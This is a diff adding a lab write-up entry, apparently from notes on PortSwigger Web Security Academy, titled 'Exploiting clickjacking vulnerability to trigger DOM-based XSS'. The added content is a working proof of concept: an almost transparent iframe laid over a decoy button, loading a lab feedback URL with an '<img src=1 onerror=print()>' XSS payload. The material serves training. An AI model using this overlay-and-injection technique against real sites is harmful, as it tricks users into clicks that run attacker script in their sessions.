@@ -76,3 +76,24 @@ this parameter fills the data into the email box. like any data passed to this p
 ## LAB-4
 
 ***Exploiting clickjacking vulnerability to trigger DOM-based XSS***
+
+```
+<style>
+	iframe {
+        position:absolute;
+        width:1000px;
+        height: 1000px;
+        opacity:0.00001;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:520px;
+        left:80px;
+        z-index: 1;
+    }
+</style>
+<div>Test me</div>
+<iframe
+src="http://0a6900c803c4eadb80c4e96e00520051.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=123@gmail.com&subject=a&message=a"></iframe>
+```
